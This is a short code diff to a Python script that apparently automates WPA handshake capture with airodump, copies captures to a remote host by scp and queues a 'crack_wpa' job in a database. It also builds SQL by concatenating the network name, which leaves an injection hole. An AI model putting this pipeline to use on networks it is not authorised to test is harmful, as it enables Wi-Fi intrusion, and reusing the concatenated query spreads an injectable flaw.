@@ -39,12 +39,15 @@ def check_routine (BSSID, proc_airodump):
 		command+=" isis@193.191.187.44:."
 		os.system(command)
 		os.kill(proc_airodump.pid, SIGINT)
+		hand_assignment(BSSID, ESSID, timestamp)
 
-def hand_assignment(BSSID, ESSID):
+def hand_assignment(BSSID, ESSID, timestamp):
 	query= "insert into assignments (assignment, status, caption, parameter) values ('crack_wpa', 'new', 'isis-OptiPlex-755', '"
 	query+=BSSID
 	query+="|"
 	query+=ESSID
+	query+="|"
+	query+=timestamp
 	query+="');"
 	print (query)
 	executequery(query)
@@ -76,7 +79,6 @@ def automated(BSSID, channel, ESSID):
 	os.makedirs("/home/isis/psk")
 	interface= start_monitor("wlan0", channel)
 	capture(channel, BSSID, interface)
-	hand_assignment(BSSID, ESSID)
 	stop_monitor(interface)
 	cleanup()
 
